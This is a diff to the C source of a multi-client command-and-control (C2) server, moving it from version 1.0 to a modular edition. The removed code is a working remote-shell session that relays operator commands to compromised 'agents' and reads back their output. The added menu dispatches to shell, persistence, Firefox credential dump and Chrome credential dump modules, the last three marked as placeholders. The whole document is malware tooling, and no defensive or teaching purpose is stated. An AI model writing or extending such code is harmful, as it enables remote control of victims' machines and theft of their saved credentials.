@@ -7,6 +7,7 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 #include <time.h>
+#include "modules/modules.h"
 
 #define BUFFER_SIZE 4096
 #define MAX_CLIENTS 50
@@ -35,9 +36,11 @@ void init_clients();
 int add_client(int socket, struct sockaddr_in addr);
 void remove_client(int id);
 void list_clients();
-void shell_session(int client_id);
+void agent_context_menu(int client_id);
+void show_agent_info(int client_id);
 void cleanup_server();
 void print_help();
+void print_agent_help();
 
 void init_clients() {
     for (int i = 0; i < MAX_CLIENTS; i++) {
@@ -130,99 +133,95 @@ void list_clients() {
     pthread_mutex_unlock(&clients_mutex);
 }
 
-void shell_session(int client_id) {
-    int client_socket = -1;
-    int client_index = -1;
-    
-    // Find the client
+// Module implementations moved to modules/ directory
+
+void agent_context_menu(int client_id) {
+    // Verify client exists
     pthread_mutex_lock(&clients_mutex);
+    int found = 0;
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i].active && clients[i].id == client_id) {
-            client_socket = clients[i].socket;
-            client_index = i;
+            found = 1;
             break;
         }
     }
     pthread_mutex_unlock(&clients_mutex);
     
-    if (client_socket == -1) {
-        printf("[-] Client %d not found or disconnected\n", client_id);
+    if (!found) {
+        printf("[-] Agent %d not found or disconnected\n", client_id);
         return;
     }
     
-    printf("[*] Starting shell session with client %d\n", client_id);
-    printf("[*] Type 'exit' to return to main menu\n\n");
+    printf("\n[*] Entering agent context for agent %d\n", client_id);
+    printf("[*] Type 'help' to see available modules\n\n");
     
-    char buffer[BUFFER_SIZE];
-    fd_set read_fds;
-    struct timeval timeout;
+    char command[256];
     
     while (1) {
-        printf("shell@client%d> ", client_id);
+        printf("agent(%d)> ", client_id);
         fflush(stdout);
         
-        // Read command from user
-        if (fgets(buffer, BUFFER_SIZE, stdin) == NULL) {
+        if (fgets(command, sizeof(command), stdin) == NULL) {
             break;
         }
         
-        // Check for exit command
-        if (strncmp(buffer, "exit\n", 5) == 0) {
-            printf("[*] Exiting shell session\n");
+        // Remove newline
+        command[strcspn(command, "\n")] = 0;
+        
+        if (strlen(command) == 0) {
+            continue;
+        }
+        
+        if (strcmp(command, "shell") == 0) {
+            module_shell(client_id);
+        }
+        else if (strcmp(command, "persistence") == 0) {
+            module_persistence(client_id);
+        }
+        else if (strcmp(command, "firefox-dump") == 0) {
+            module_firefox_dump(client_id);
+        }
+        else if (strcmp(command, "chrome-dump") == 0) {
+            module_chrome_dump(client_id);
+        }
+        else if (strcmp(command, "info") == 0) {
+            show_agent_info(client_id);
+        }
+        else if (strcmp(command, "back") == 0) {
+            printf("[*] Returning to main menu\n\n");
             break;
         }
-        
-        // Send command to client
-        pthread_mutex_lock(&clients[client_index].lock);
-        ssize_t sent = send(client_socket, buffer, strlen(buffer), 0);
-        
-        if (sent <= 0) {
-            pthread_mutex_unlock(&clients[client_index].lock);
-            printf("[-] Failed to send command. Client may be disconnected.\n");
-            remove_client(client_id);
-            break;
+        else if (strcmp(command, "help") == 0) {
+            print_agent_help();
         }
-        
-        // Read all available output from client using select with timeout
-        while (1) {
-            FD_ZERO(&read_fds);
-            FD_SET(client_socket, &read_fds);
-            
-            // Set timeout to 200ms - if no data arrives in this time, assume output is complete
-            timeout.tv_sec = 0;
-            timeout.tv_usec = 200000;
-            
-            int ready = select(client_socket + 1, &read_fds, NULL, NULL, &timeout);
-            
-            if (ready < 0) {
-                // Error
-                pthread_mutex_unlock(&clients[client_index].lock);
-                printf("[-] Select error\n");
-                remove_client(client_id);
-                return;
-            } else if (ready == 0) {
-                // Timeout - no more data available
-                break;
-            }
-            
-            // Data is available, read it
-            memset(buffer, 0, BUFFER_SIZE);
-            ssize_t received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
-            
-            if (received <= 0) {
-                pthread_mutex_unlock(&clients[client_index].lock);
-                printf("[-] Client disconnected\n");
-                remove_client(client_id);
-                return;
-            }
-            
-            // Print output immediately
-            printf("%s", buffer);
-            fflush(stdout);
+        else {
+            printf("[-] Unknown module: %s\n", command);
+            printf("[-] Type 'help' for available modules\n");
         }
-        
-        pthread_mutex_unlock(&clients[client_index].lock);
     }
+}
+
+void show_agent_info(int client_id) {
+    pthread_mutex_lock(&clients_mutex);
+    
+    for (int i = 0; i < MAX_CLIENTS; i++) {
+        if (clients[i].active && clients[i].id == client_id) {
+            char time_str[20];
+            strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", 
+                    localtime(&clients[i].connected_at));
+            
+            printf("\n=== Agent Information ===\n");
+            printf("Agent ID:       %d\n", clients[i].id);
+            printf("IP Address:     %s\n", inet_ntoa(clients[i].addr.sin_addr));
+            printf("Port:           %d\n", ntohs(clients[i].addr.sin_port));
+            printf("Connected At:   %s\n", time_str);
+            printf("Status:         Active\n");
+            printf("========================\n\n");
+            break;
+        }
+    }
+    
+    pthread_mutex_unlock(&clients_mutex);
 }
 
 void* listener_thread(void* arg) {
@@ -254,11 +253,23 @@ void* listener_thread(void* arg) {
 
 void print_help() {
     printf("\n=== C2 Server Commands ===\n");
-    printf("  list              - List all connected clients\n");
-    printf("  shell <id>        - Start interactive shell with client\n");
+    printf("  list              - List all connected agents\n");
+    printf("  use <id>          - Select agent and enter context\n");
     printf("  help              - Show this help message\n");
     printf("  quit              - Shutdown server\n");
     printf("==========================\n\n");
+}
+
+void print_agent_help() {
+    printf("\n=== Available Modules ===\n");
+    printf("  shell             - Interactive shell access\n");
+    printf("  persistence       - Persistence mechanisms (placeholder)\n");
+    printf("  firefox-dump      - Firefox credential dumping (placeholder)\n");
+    printf("  chrome-dump       - Chrome credential dumping (placeholder)\n");
+    printf("  info              - Show agent information\n");
+    printf("  back              - Return to main menu\n");
+    printf("  help              - Show this help message\n");
+    printf("=========================\n\n");
 }
 
 void cleanup_server() {
@@ -287,7 +298,8 @@ int main(int argc, char *argv[]) {
     pthread_t listener_tid;
     
     printf("=================================\n");
-    printf("  Multi-Client C2 Server v1.0\n");
+    printf("  Multi-Client C2 Server v2.0\n");
+    printf("  Modular Framework Edition\n");
     printf("=================================\n\n");
     
     // Initialize client array
@@ -360,12 +372,12 @@ int main(int argc, char *argv[]) {
         if (strcmp(command, "list") == 0) {
             list_clients();
         }
-        else if (strncmp(command, "shell ", 6) == 0) {
-            int client_id = atoi(command + 6);
+        else if (strncmp(command, "use ", 4) == 0) {
+            int client_id = atoi(command + 4);
             if (client_id > 0) {
-                shell_session(client_id);
+                agent_context_menu(client_id);
             } else {
-                printf("[-] Invalid client ID\n");
+                printf("[-] Invalid agent ID\n");
             }
         }
         else if (strcmp(command, "help") == 0) {
